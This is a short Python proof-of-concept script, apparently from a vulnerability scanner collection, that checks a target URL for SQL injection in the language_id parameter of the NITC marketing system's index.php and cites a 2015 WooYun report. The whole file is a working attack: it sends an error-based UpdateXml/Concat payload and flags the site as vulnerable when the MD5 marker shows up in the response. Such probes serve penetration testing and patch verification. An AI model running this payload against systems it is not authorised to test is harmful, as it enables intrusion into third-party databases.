#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: NITC营销系统index.php SQL注入
referer: http://wooyun.org/bugs/wooyun-2015-0152825
author: Lucifer
description: 文件/index.php中,参数language_id存在SQL注入。
'''
import sys
import requests



class nitc_index_language_id_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index.php?language_id=1%20Or%20UpDateXml(1,CoNcAt(0x5c,Md5(1234)),1)%23--&is_protect=1&action=test"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed05" in req.text:
                return "[+]存在NITC营销系统index.php SQL注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = nitc_index_language_id_sqli_BaseVerify(sys.argv[1])
    testVuln.run()